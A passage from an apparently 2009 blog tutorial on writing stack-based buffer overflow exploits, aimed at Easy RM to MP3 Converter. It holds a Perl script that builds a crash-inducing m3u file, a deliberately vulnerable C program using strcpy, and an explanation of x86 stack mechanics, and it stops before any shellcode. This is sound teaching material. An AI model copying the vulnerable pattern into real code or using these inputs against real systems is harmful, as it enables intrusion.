	<li><a href="https://www.corelan.be/index.php/category/security/" title="Security" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Security</span></a>
	<ul>
		<li><a href="https://www.corelan.be/index.php/security/corelan-team-members/" title="Corelan Team Members" data-wpel-link="internal">Corelan Team Members</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/security/corelan-team-members/membership-how-to/" title="Corelan Team Membership" data-wpel-link="internal">Corelan Team Membership</a>
			</li>
		</ul>
		</li>
		<li><a href="https://www.corelan-training.com" title="Corelan Training &quot;Corelan Live - Win32 Exploit Development Bootcamp&quot;" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left" aria-label=" (opens in a new tab)"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Corelan Training "Corelan Live…</a>
		</li>
		<li><a href="/index.php/category/security/exploit-writing-tutorials/" title="Exploit writing tutorials" data-wpel-link="internal">Exploit writing tutorials</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/metasploit/" title="Metasploit" data-wpel-link="internal">Metasploit</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/2010/10/12/death-of-an-ftp-client/" title="FTP Client fuzzer" data-wpel-link="internal">FTP Client fuzzer</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/2010/11/12/metasploit-module-http-form-field-fuzzer/" title="HTTP Form field fuzzer" data-wpel-link="internal">HTTP Form field fuzzer</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/security/metasploit/simple-ftp-fuzzer-metasploit-module/" title="Simple FTP Fuzzer - Metasploit Module" data-wpel-link="internal">Simple FTP Fuzzer – Metasploit…</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/2009/01/31/nessus-wrapper-for-ike-scan/" title="Nessus/Openvas ike-scan wrapper" data-wpel-link="internal">Nessus/Openvas ike-scan wrapper</a>
		</li>
		<li><a href="/index.php/disclosure-policy/" title="Vulnerability Disclosure Policy" data-wpel-link="internal">Vulnerability Disclosure Policy</a>
		</li>
		<li><a href="https://github.com/corelan/mona" title="mona.py PyCommand for Immunity Debugger" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left" aria-label=" (opens in a new tab)"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>mona.py PyCommand for Immunity Debugger</a>
		<ul>
			<li><a href="https://github.com/corelan/mona" title="Download mona.py" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left" aria-label=" (opens in a new tab)"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Download mona.py</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" title="Mona.py - documentation" data-wpel-link="internal">Mona.py – documentation</a>
			</li>
		</ul>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/corelan-ropdb/" title="Corelan ROPdb" data-wpel-link="internal">Corelan ROPdb</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/security/mirror-for-bobs-immunity-debugger-projects/" title="Mirror for BoB's Immunity Debugger projects" data-wpel-link="internal">Mirror for BoB’s Immunity Debugger…</a>
		</li>
	</ul>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/terms-of-use/" title="Terms of use" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Terms of use</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/donate/" title="Donate" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Donate</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="/index.php/about-us/about-corelan-team" title="About..." data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">About…</span></a>
	<ul>
		<li><a href="https://www.corelan.be/index.php/about-us/about-corelan-team/" title="About Corelan Team" data-wpel-link="internal">About Corelan Team</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/about-me/" title="About me" data-wpel-link="internal">About me</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/antivirusantimalware/" title="Antivirus/antimalware" data-wpel-link="internal">Antivirus/antimalware</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/publickeys/" title="Corelan public keys" data-wpel-link="internal">Corelan public keys</a>
		</li>
		<li><a href="https://www.corelan.be/index.php/about-us/sitemap/" title="Sitemap" data-wpel-link="internal">Sitemap</a>
		</li>
	</ul>
	</li>
</ul>
            </div>
<div class="art-content-layout">
    <div class="art-content-layout-row">
        <div class="art-layout-cell art-content">
			


<br><center></center><br><div class="art-post">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    	<div class="navigation">
		<div class="alignleft">« <a href="https://www.corelan.be/index.php/2009/07/16/spread-the-word-nmap-5-released/" title="Spread the word ! nmap 5 released" rel="prev" data-wpel-link="internal">Spread the word ! nmap 5 released</a></div>
		<div class="alignright"><a href="https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/" title="Exploit writing tutorial part 2 : Stack Based Overflows – jumping to shellcode" rel="next" data-wpel-link="internal">Exploit writing tutorial part 2 : Stack Based Overflows – jumping to…</a> »</div>
	 </div>	                    <!-- /article-content -->
	                </div>
	                <div class="cleared"></div>
	                	            </div>
			<div class="cleared"></div>
	    </div>
	</div>
	
	<br><b><center><i>Please consider donating: <a href="https://www.corelan.be/index.php/donate/" data-wpel-link="internal">https://www.corelan.be/index.php/donate/</a></i></center></b><br><center><br><b>857,763 views</b><br></center><div class="art-post post-2114 post type-post status-publish format-standard hentry category-security category-exploit-writing-tutorials category-exploits tag-828 tag-buffer tag-buffer-overflow tag-buffersize tag-bytes tag-discover tag-ebp tag-eip tag-esp tag-exploit tag-exploit-laboratory tag-exploit-writing-tutorial tag-hack tag-learn tag-metasploit tag-nop tag-nop-sled tag-nop-slide tag-overflow tag-pattern_create tag-pattern_offset tag-pop tag-push tag-register tag-saumil-shah tag-shellcode tag-sk-chong tag-stack tag-stack-overflow tag-write" id="post-2114">
	    <div class="art-post-tl"></div>
	    <div class="art-post-tr"></div>
	    <div class="art-post-bl"></div>
	    <div class="art-post-br"></div>
	    <div class="art-post-tc"></div>
	    <div class="art-post-bc"></div>
	    <div class="art-post-cl"></div>
	    <div class="art-post-cr"></div>
	    <div class="art-post-cc"></div>
	    <div class="art-post-body">
	            <div class="art-post-inner art-article">
	            <h2 class="art-postheader"><img src="https://www.corelan.be/wp-content/themes/corelan/images/postheadericon.png" width="32" height="30" alt="">Exploit writing tutorial part 1 : Stack Based Overflows</h2><div class="art-postmetadataheader"><div class="art-postheadericons art-metadata-icons"><span class="date">Published</span> <span class="entry-date"><abbr class="published" title="08:55">July 19, 2009</abbr></span> | <img src="https://www.corelan.be/wp-content/themes/corelan/images/postauthoricon.png" width="18" height="18" alt=""><span class="author">By</span> <span class="author vcard"><a class="url fn n" href="https://www.corelan.be/index.php/author/admin1/" title="View all posts by Peter Van Eeckhoutte (corelanc0d3r)" data-wpel-link="internal">Peter Van Eeckhoutte (corelanc0d3r)</a></span></div></div>	                <div class="art-postcontent">
	                    <!-- article-content -->
	                    <p>Last friday (july 17th 2009), somebody (nick)named ‘Crazy_Hacker’ has reported a vulnerability in <a href="https://web.archive.org/web/20160304214949/http://rm-to-mp3.net/download.html" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Easy RM to MP3 Conversion Utility</a> (on XP SP2 En), via packetstormsecurity.org. (see <a title="http://packetstormsecurity.org/0907-exploits/mixsense-crash.txt" href="http://packetstormsecurity.org/0907-exploits/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>http://packetstormsecurity.org/0907-exploits/</a>). The vulnerability report included a proof of concept exploit (which, by the way,&nbsp; failed to work on my MS Virtual PC based XP SP3 En). <a href="https://www.exploit-db.com/exploits/9186" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Another exploit</a> was released just a little bit later.</p>
<p>Nice work.&nbsp; You can copy the PoC exploit code, run it, see that it doesn’t work (or if you are lucky, conclude that it works), or… you can try to understand the process of building the exploit so you can correct broken exploits, or just build your own exploits from scratch.</p>
<p>(By the way : unless you can disassemble, read and comprehend shellcode real fast, I would never advise you to just take an exploit (especially if it’s a precompiled executable) and run it.&nbsp; What if it’s just built to open a backdoor on your own computer ?</p>
<p>The question is : How do exploit writers build their exploits ? What does the process of going from detecting a possible issue to building an actual working exploit look like ? How can you use vulnerability information to build your own exploit ?</p>
<p>Ever since I’ve started this blog, writing a basic tutorial about writing buffer overflows has been on my “to do” list… but I never really took the time to do so (or simply forgot about it).</p>
<p>When I saw the vulnerability report today, and had a look at the exploit, I figured this vulnerability report could acts as a perfect example to explain the basics about writing exploits… It’s clean, simple and allows me to demonstrate some of the techniques that are used to write working and stable stack based buffer overflows.</p>
<p>So perhaps this is a good time…&nbsp; Despite the fact that the forementioned vulnerability report already includes an exploit (working or not), I’ll still use the vulnerability in “Easy RM to MP3 conversion utility” as an example and we’ll go through the steps of building a working exploit, without copying anything from the original exploit. We’ll just build it from scratch (and make it work on XP SP3 this time :) )</p>
<p>Before we continue, let me get one thing straight. This document is purely intended for educational purposes. I do not want anyone to use this information (or any information on this blog) to actually hack into computers or do other illegal things. So I cannot be held responsible for the acts of other people who took parts of this document and used it for illegal purposes. If you don’t agree, then you are not allowed to continue to access this website… so leave this website immediately.</p><div style="width: 100%; height: auto; clear: both; text-align: center;" class="google-auto-placed ap_container"><ins style="display: block; margin: auto; background-color: transparent; height: 280px;" data-ad-format="auto" class="adsbygoogle adsbygoogle-noablate" data-ad-client="ca-pub-8134501503628637" data-adsbygoogle-status="done"><div id="aswift_4_host" style="border: medium; height: 280px; width: 763px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins></div>
<p>Anyways, that having said, the kind of information that you get from vulnerability reports usually contains information on the basics of the vulnerability. In this case, the vulnerability report states “Easy RM to MP3 Converter version 2.7.3.700 universal buffer overflow exploit that creates a malicious .m3u file”. In other words, you can create a malicious .m3u file, feed it into the utility and trigger the exploit. These reports may not be very specific every time, but in most cases you can get an idea of how you can simulate a crash or make the application behave weird. If not, then the security researcher probably wanted to disclose his/her findings first to the vendor, give them the opportunity to fix things… or just wants to keep the intel for him/herself…</p>
<h3>Verify the bug</h3>
<p>First of all, let’s verify that the application does indeed crash when opening a malformatted m3u file. (or find yourself an application that crashes when you feed specifically crafted data to it).</p>
<p>Get yourself a copy of the vulnerable version of Easy RM to MP3 and install it on a computer running Windows XP. The vulnerability report states that the exploit works on XP SP2 (English), but I’ll use XP SP3 (English).</p>
<p>You can find a copy of the vulnerable application on <a href="https://www.exploit-db.com/exploits/10619" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>exploit-db</a></p>
<p><a href="/wp-content/uploads/2009/07/image4.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img fetchpriority="high" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb4.png" alt="image" width="407" height="172" border="0"></a></p>
<p><em>Quick sidenote : you can find older versions of applications at </em><a title="oldapps.com" href="http://oldapps.com/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i><em>oldapps.com</em></a><em> and </em><a title="oldversion.com" href="http://oldversion.com/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i><em>oldversion.com</em></a>, or by looking at exploits on exploit-db.com (which often have a local copy of the vulnerable application as well)</p>
<p>We’ll use the following simple perl script to create a .m3u file that may help us to discover more information about the vulnerability :</p><div style="width: 100%; height: auto; clear: both; text-align: center;" class="google-auto-placed ap_container"><ins style="display: block; margin: auto; background-color: transparent; height: 280px;" data-ad-format="auto" class="adsbygoogle adsbygoogle-noablate" data-ad-client="ca-pub-8134501503628637" data-adsbygoogle-status="done"><div id="aswift_5_host" style="border: medium; height: 280px; width: 763px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins></div>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"crash.m3u"</span>;
my $junk= <span style="color: #006080;">"\x41"</span> x 10000;
open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE <span style="color: #006080;">"$junk"</span>;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>Run the perl script to create the m3u file. The fill will be filled with 10000 A’s (\x41 is the hexadecimal representation of A) and open this m3u file with Easy RM to MP3….&nbsp; The application throws an error, but it looks like the error is handled correctly and the application does not crash.&nbsp; Modify the script to write a file with 20000 A’s and try again.&nbsp;&nbsp; Same behaviour. (exception is handled correctly, so we still could not overwrite anything usefull). Now change the script to write 30000 A’s, create the m3u file and open it in the utility.</p>
<p>Boom – application dies.</p>
<p>Ok, so the application crashes if we feed it a file that contains between 20000 and 30000 A’s. But what can we do with this ?</p>
<h3>Verify the bug – and see if it could be interesting</h3>
<p>Obviously, not every application crash can lead to an exploitation. In many cases, an application crash will not lead to exploitation… But sometimes it does.&nbsp;&nbsp; With “exploitation”, I mean that you want the application to do something it was not intended to do… such as running your own code.&nbsp; The easiest way to make an application do something different is by controlling its application flow (and redirect it to somewhere else).&nbsp; This can be done by controlling the <a href="http://en.wikipedia.org/wiki/X86_assembly_language" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Instruction Pointer</a> (or Program Counter), which is a CPU register that contains a pointer to where the next instruction that needs to be executed is located.</p>
<p>Suppose an application calls a function with a parameter. Before going to the function, it saves the current location in the instruction pointer (so it knows where to return when the function completes).&nbsp; If you can modify the value in this pointer, and point it to a location in memory that contains your own piece of code, then you can change the application flow and make it execute something different (other than returning back to the original place). The code that you want to be executed after controlling the flow is often referred to as “shellcode”. So if we make the application run our shellcode, we can call it a working exploit.&nbsp; In most cases, this pointer is referenced by the term EIP. This register size is 4 bytes. So if you can modify those 4 bytes, you own the application (and the computer the application runs on)</p>
<h3>Before we proceed – some theory</h3>
<p>Just a few terms that you will need :</p>
<p>Every Windows application uses parts of memory.&nbsp; The process memory contains 3 major components :</p>
<ul>
<li>code segment (instructions that the processor executes.&nbsp; The EIP keeps track of the next instruction)</li>
<li>data segment (variables, dynamic buffers)</li>
<li>stack segment (used to pass data/arguments to functions, and is used as space for variables. The stack starts (= the bottom of the stack) from the very end of the virtual memory of a page and grows down (to a lower address).&nbsp; a PUSH adds something to the top of the stack, POP will remove one item (4 bytes) from the stack and puts it in a register.</li>
</ul><div style="width: 100%; height: auto; clear: both; text-align: center;" class="google-auto-placed ap_container"><ins style="display: block; margin: auto; background-color: transparent; height: 280px;" data-ad-format="auto" class="adsbygoogle adsbygoogle-noablate" data-ad-client="ca-pub-8134501503628637" data-adsbygoogle-status="done"><div id="aswift_6_host" style="border: medium; height: 280px; width: 763px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins></div>
<p>If you want to access the stack memory directly, you can use ESP (Stack Pointer), which points at the top (so the lowest memory address) of the stack.</p>
<ul>
<li>After a push, ESP will point to a lower memory address (address is decremented with the size of the data that is pushed onto the stack, which is 4 bytes in case of addresses/pointers). Decrements usually happen before the item is placed on the stack (depending on the implementation… if ESP already points at the next free location in the stack, the decrement happens after placing data on the stack)</li>
<li>After a POP, ESP points to a higher address (address is incremented (by 4 bytes in case of addresses/pointers)). Increments happen after an item is removed from the stack.</li>
</ul>
<p>When a function/subroutine is entered, a stack frame is created. This frame keeps the parameters of the parent procedure together and is used to pass arguments to the subrouting.&nbsp; The current location of the stack can be accessed via the stack pointer (ESP), the current base of the function is contained in the base pointer (EBP) (or frame pointer).</p>
<p>The CPU’s general purpose registers (Intel, x86) are :</p>
<ul>
<li>EAX : accumulator : used for performing calculations, and used to store return values from function calls. Basic operations such as add, subtract, compare use this general-purpose register</li>
<li>EBX : base (does not have anything to do with base pointer). It has no general purpose and can be used to store data.</li>
<li>ECX : counter : used for iterations. ECX counts downward.</li>
<li>EDX : data : this is an extension of the EAX register. It allows for more complex calculations (multiply, divide) by allowing extra data to be stored to facilitate those calculations.</li>
<li>ESP : stack pointer</li>
<li>EBP : base pointer</li>
<li>ESI : source index : holds location of input data</li>
<li>EDI : destination index&nbsp; : points to location of where result of data operation is stored</li>
<li>EIP : instruction pointer</li>
</ul>
<h3>Process Memory</h3>
<p>When an application is stared in a Win32 environment, a process is created and virtual memory is assigned to.&nbsp; In a 32 bit process, the address ranges from 0x00000000 to 0xFFFFFFFF, where 0x00000000 to 0x7FFFFFFF is assigned to “user-land”, and 0x80000000 to 0xFFFFFFFF is assigned to “kernel land”.&nbsp; Windows uses the <a href="http://en.wikipedia.org/wiki/Flat_memory_model" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>flat memory model</a>, which means that the CPU can directly/sequentially/linearly address all of the available memory locations, without having to use a segmentation/paging scheme.</p>
<p>Kernel land memory is only accessible by the OS.</p>
<p>When a process is created, a <a href="http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>PEB</a> (Process Execution Block) and TEB (Thread Environment Block) are created.</p>
<p>The PEB contains all user land parameters that are associated with the current process :</p><div style="width: 100%; height: auto; clear: both; text-align: center;" class="google-auto-placed ap_container"><ins style="display: block; margin: auto; background-color: transparent; height: 280px;" data-ad-format="auto" class="adsbygoogle adsbygoogle-noablate" data-ad-client="ca-pub-8134501503628637" data-adsbygoogle-status="done"><div id="aswift_7_host" style="border: medium; height: 280px; width: 763px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins></div>
<ul>
<li>location of the main executable</li>
<li>pointer to loader data (can be used to list all dll’s / modules that are/can be loaded into the process)</li>
<li>pointer to information about the heap</li>
</ul>
<p>The TEB describes the state of a thread, and includes</p>
<ul>
<li>location of the PEB in memory</li>
<li>location of the stack for the thread it belongs to</li>
<li>pointer to the first entry in the SEH chain (see tutorial 3 and 3b to learn more about what a SEH chain is)</li>
</ul>
<p>Each thread inside the process has one TEB.</p>
<p>The Win32 process memory map looks like this :</p>
<p><a href="/wp-content/uploads/2010/08/image3.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/08/image_thumb3.png" alt="image" width="588" height="677" border="0"></a></p>
<p>The text segment of a program image / dll is readonly, as it only contains the application code. This prevents people from modifying the application code. This memory segment has a fixed size.&nbsp;&nbsp; The data segment is used to store global and static program variables. The data segment is used for initialized global variables, strings, and other constants.</p>
<p>The data&nbsp; segment is writable and has a fixed size. The heap segment is used for the rest of the program variables. It can grow larger or smaller as desired.&nbsp; All of the memory in the heap is managed by allocator (and deallocator) algorithms. A memory region is reserved by these algo’s.&nbsp; The heap will grow towards a higher addresses.</p><div style="width: 100%; height: auto; clear: both; text-align: center;" class="google-auto-placed ap_container"><ins style="display: block; margin: auto; background-color: transparent; height: 280px;" data-ad-format="auto" class="adsbygoogle adsbygoogle-noablate" data-ad-client="ca-pub-8134501503628637" data-adsbygoogle-status="done"><div id="aswift_8_host" style="border: medium; height: 280px; width: 763px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins></div>
<p>In a dll, the code, imports (list of functions used by the dll, from another dll or application), and exports (functions it makes available to other dll’s applications) are part of the .text segment.</p>
<p>&nbsp;</p>
<h3>The Stack</h3>
<p>The <a href="http://en.wikipedia.org/wiki/Stack-based_memory_allocation" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>stack</a> is a piece of the process memory, a data structure that works LIFO (Last in first out). A stack gets allocated by the OS, for each thread (when the thread is created).&nbsp; When the thread ends, the stack is cleared as well.&nbsp;&nbsp;&nbsp; The size of the stack is defined when it gets created and doesn’t change. Combined with LIFO and the fact that it does not require complex management structures/mechanisms to get managed, the stack is pretty fast, but limited in size.</p>
<p>LIFO means that the most recent placed data (result of a PUSH instruction) is the first one that will be removed from the stack again. (by a POP instruction).</p>
<p>When a stack is created, the stack pointer points to the top of the stack ( = the highest address on the stack). As information is pushed onto the stack, this stack pointer decrements (goes to a lower address).&nbsp; So in essence, the stack grows to a lower address.</p>
<p>The stack contains local variables, function calls and other info that does not need to be stored for a larger amount of time.&nbsp;&nbsp; As more data is added to the stack (pushed onto the stack), the stack pointer is decremented and points at a lower address value.</p>
<p>Every time a function is called, the function parameters are pushed onto the stack, as well&nbsp; as the saved values of registers (EBP, EIP).&nbsp; When a function returns, the saved value of EIP is retrieved from the stack and placed back in EIP, so the normal application flow can be resumed.</p>
<p>Let’s use a few lines of simple code to demonstrate the behaviour :</p>
<pre class="brush:cpp">#include <string.h> 

void do_something(char *Buffer)
{
     char MyVar[128];
     strcpy(MyVar,Buffer);
}

int main (int argc, char **argv)
{
     do_something(argv[1]);
}</string.h></pre>
<blockquote><p>(You can compile this code. Get yourself a copy of Dev-C++ 4.9.9.2, create a new Win32 console project (use C as language, not C++), paste the code and compile it). On my system, I called the project “stacktest”.</p>
<p>Run the application : “stacktest.exe AAAA”.&nbsp; Nothing should return.</p></blockquote>
<p>&nbsp;</p>
<p>This applications takes an argument (argv[1] and passes the argument to function do_something().&nbsp; In that function, the argument is copied into a local variable that has a maximum of 128 bytes. So… if the argument is longer than 127 bytes (+ a null byte to terminate the string), the buffer may get overflown.</p>
<p>When function “do_something(param1)” gets called from inside main(), the following things happen :</p>
<p>A new stack frame will be created, on top of the ‘parent’ stack. The stack pointer (ESP) points to the highest address of the newly created stack. This is the “top of the stack”.</p>
<p><a class="thickbox no_icon" href="/wp-content/uploads/2010/09/image19.png" rel="gallery-2114" data-wpel-link="internal"><img decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb19.png" alt="image" width="273" height="344" border="0"></a></p>
<p>Before do_something() is called, a pointer to the argument(s) gets pushed to the stack. In our case, this is a pointer to argv[1].</p>
<p><a href="/wp-content/uploads/2010/09/image26.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb26.png" alt="image" width="617" height="262" border="0"></a></p>
<p>Stack after the MOV instruction :</p>
<p><a href="/wp-content/uploads/2010/09/image27.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb27.png" alt="image" width="520" height="113" border="0"></a></p>
<p>Next, function do_something is called.&nbsp; The CALL instruction will first put the current instruction pointer onto the stack (so it knows where to return to if the function ends) and will then jump to the function code.</p>
<p>Stack after the CALL instruction :</p>
<p><a href="/wp-content/uploads/2010/09/image28.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb28.png" alt="image" width="519" height="149" border="0"></a></p>
<p>As a result of the push, ESP decrements 4 bytes and now points to a lower address.</p>
<p><a href="/wp-content/uploads/2010/09/image20.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb20.png" alt="image" width="321" height="407" border="0"></a></p>
<p>(or, as seen in a debugger) :</p>
<p>ESP points at 0022FF5C. At this address, we see the saved EIP (Return to…), followed by a pointer to the parameter (AAAA in this example). This pointer was saved on the stack before the CALL instruction was executed.</p>
<p><a href="/wp-content/uploads/2011/12/image.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="background-image: none; margin: 7px; padding-left: 0px; padding-right: 0px; display: inline; padding-top: 0px; border: 0px;" title="image" src="/wp-content/uploads/2011/12/image_thumb.png" alt="image" width="738" height="119" border="0"></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>Next, the function prolog executes. This basically saves the frame pointer (EBP) onto the stack, so it can be restored as well when the function returns. The instruction to save the frame pointer is “push ebp”. ESP is decremented again with 4 bytes.</p>
<p><a href="/wp-content/uploads/2010/09/image22.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb22.png" alt="image" width="340" height="432" border="0"></a></p>
<p>Following the push ebp, the current stack pointer (ESP) is put in EBP.&nbsp; At that point, both ESP and EBP point at the top of the current stack. From that point on, the stack will usually be referenced by ESP (top of the stack at any time) and EBP (the base pointer of the current stack). This way, the application can reference variables by using an offset to EBP.</p>
<blockquote><p>Most functions start with this sequence :&nbsp; PUSH EBP, followed by MOV EBP,ESP</p></blockquote><div style="width: 100%; height: auto; clear: both; text-align: center;" class="google-auto-placed ap_container"><ins style="display: block; margin: auto; background-color: transparent; height: 280px;" data-ad-format="auto" class="adsbygoogle adsbygoogle-noablate" data-ad-client="ca-pub-8134501503628637" data-adsbygoogle-status="done"><div id="aswift_9_host" style="border: medium; height: 280px; width: 763px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"></div></ins></div>
<p>So, if you would push 4 bytes to the stack, ESP would decrement with 4 bytes and EBP would still stay where it was. You can then reference these 4 bytes using EBP-0x4.</p>
<p>Next, we can see how stack space for the variable MyVar (128bytes) is declared/allocated. In order to hold the data, some space is allocated on the stack to hold data in this variable… ESP is decremented by a number of bytes.&nbsp; This number of bytes wil most likely be more than 128 bytes, because of an allocation routine determined by the compiler.&nbsp; In the case of Dev-C++, this is 0x98 bytes. So you will see a SUB ESP,0x98 instruction.&nbsp; That way, there will be space available for this variable.</p>
<p><a href="/wp-content/uploads/2010/09/image23.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb23.png" alt="image" width="355" height="427" border="0"></a></p>
<p>&nbsp;</p>
<p>The disassembly of the function looks like this :</p>
<pre class="brush:plain">00401290  /$ 55             PUSH EBP
00401291  |. 89E5           MOV EBP,ESP
00401293  |. 81EC 98000000  SUB ESP,98
00401299  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |
0040129C  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |
004012A0  |. 8D85 78FFFFFF  LEA EAX,DWORD PTR SS:[EBP-88]            ; |
004012A6  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
004012A9  |. E8 72050000    CALL                 ; \strcpy
004012AE  |. C9             LEAVE
004012AF  \. C3             RETN</pre>
<p>(don’t worry about the code too much. You can clearly see the function prolog (PUSH EBP and MOV EBP,ESP), you can also see where space gets allocated for MyVar (SUB ESP,98), and you can see some MOV and LEA instructions (which basically set up the parameters for the strcpy function…&nbsp; taking the pointer where argv[1] sits and using it to copy data from, into MyVar.</p>
<p>If there would not have been a strcpy() in this function, the function would now end and “unwind” the stack. Basically, it would just move ESP back to the location where saved EIP was, and then issues a RET instruction.&nbsp; A ret, in this case, will pick up the saved EIP pointer from the stack and jump to it. (thus, it will go back to the main function, right after where do_something() was called).&nbsp; The epilog instruction is executed by a LEAVE instruction (which will restore both the framepointer and EIP).</p>
<p>In my example, we have a strcpy() function.</p>
<p>This function will read data, from the address pointed to by [Buffer], and store it in <space for="" myvar="">, reading all data until it sees a null byte (string terminator).&nbsp; While it copies the data, ESP stays where it is.&nbsp; The strcpy() does not use PUSH instructions to put data on the stack… it basically reads a byte and writes it to the stack, using an index (for example ESP, ESP+1, ESP+2, etc). So after the copy, ESP still points at the begin of the string.</space></p>
<p><a href="/wp-content/uploads/2010/09/image24.png" class="thickbox no_icon" rel="gallery-2114" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2010/09/image_thumb24.png" alt="image" width="368" height="325" border="0"></a></p>
<p>&nbsp;</p>
